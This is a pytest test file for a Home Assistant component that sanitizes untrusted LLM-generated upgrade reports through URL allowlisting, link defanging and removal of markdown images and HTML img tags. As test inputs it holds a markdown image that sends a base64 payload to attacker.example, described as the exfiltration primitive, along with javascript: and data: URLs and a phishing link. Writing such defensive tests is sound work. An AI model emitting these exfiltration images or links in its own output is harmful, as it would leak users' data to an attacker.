"""Tests for sanitizing untrusted LLM output."""

from __future__ import annotations

import pytest

from custom_components.upgrade_advisor.sanitize import (
    is_allowed_url,
    sanitize_report,
    strip_markup,
)

# --- is_allowed_url ---


@pytest.mark.parametrize(
    ("url", "allowed"),
    [
        ("https://github.com/foo/bar/releases/tag/v1", True),
        ("https://www.home-assistant.io/blog/2026/01/01/release/", True),
        ("https://community.home-assistant.io/t/1", True),
        ("http://github.com/foo", True),
        ("https://attacker.example/p", False),
        ("https://github.com.attacker.example/p", False),
        ("https://notgithub.com/foo", False),
        ("javascript:alert(1)", False),
        ("data:text/html;base64,PHNjcmlwdD4=", False),
        ("", False),
    ],
)
def test_is_allowed_url(url: str, allowed: bool) -> None:
    """Only http(s) URLs on allowlisted domains are permitted."""
    assert is_allowed_url(url) is allowed


# --- sanitize_report ---


def test_sanitize_report_removes_exfiltration_image() -> None:
    """A markdown image is the exfiltration primitive — it must not survive."""
    report = "## Report\n\n![](https://attacker.example/p?d=BASE64PAYLOAD)\n\nText."
    cleaned = sanitize_report(report)
    assert "attacker.example" not in cleaned
    assert "![" not in cleaned
    assert "Text." in cleaned


def test_sanitize_report_keeps_image_alt_text() -> None:
    """Alt text is inert prose and is preserved."""
    assert "diagram" in sanitize_report("![diagram](https://attacker.example/i.png)")


def test_sanitize_report_strips_html_img() -> None:
    """Raw HTML img tags are stripped — HA's markdown pipeline allows them."""
    cleaned = sanitize_report('Before <img src="https://attacker.example/i"> after')
    assert "attacker.example" not in cleaned
    assert "<img" not in cleaned
    assert "Before" in cleaned and "after" in cleaned


def test_sanitize_report_keeps_allowlisted_links() -> None:
    """Legitimate release-note links survive intact."""
    report = "See [the PR](https://github.com/home-assistant/core/pull/1)."
    assert sanitize_report(report) == report


def test_sanitize_report_defangs_untrusted_links() -> None:
    """A link to an unknown host is reduced to its label."""
    cleaned = sanitize_report("Click [here](https://attacker.example/phish) now")
    assert cleaned == "Click here now"


def test_sanitize_report_defangs_bare_urls() -> None:
    """Bare non-allowlisted URLs are wrapped so they are not autolinked."""
    cleaned = sanitize_report("Visit https://attacker.example/x for details")
    assert "`https://attacker.example/x`" in cleaned


def test_sanitize_report_leaves_ordinary_markdown_alone() -> None:
    """Normal report structure is untouched."""
    report = "## Foo 1.0 → 1.1\n\n**Safe to upgrade.**\n\n- item one\n\nRISK_LEVEL: Low"
    assert sanitize_report(report) == report


def test_sanitize_report_handles_empty() -> None:
    """Empty and falsy reports pass through."""
    assert sanitize_report("") == ""


# --- strip_markup ---


def test_strip_markup_flattens_everything() -> None:
    """Check-task text keeps no markup at all, allowlisted or not."""
    assert strip_markup("Check [x](https://github.com/a/b)") == "Check x"
    assert strip_markup("![](https://attacker.example/i)") == ""


def test_strip_markup_defangs_all_urls() -> None:
    """Even allowlisted bare URLs are defanged in echoed task text."""
    assert "`https://github.com/a`" in strip_markup("See https://github.com/a")


def test_strip_markup_preserves_plain_text() -> None:
    """Ordinary check titles are unchanged."""
    assert strip_markup("MQTT object_id removal") == "MQTT object_id removal"
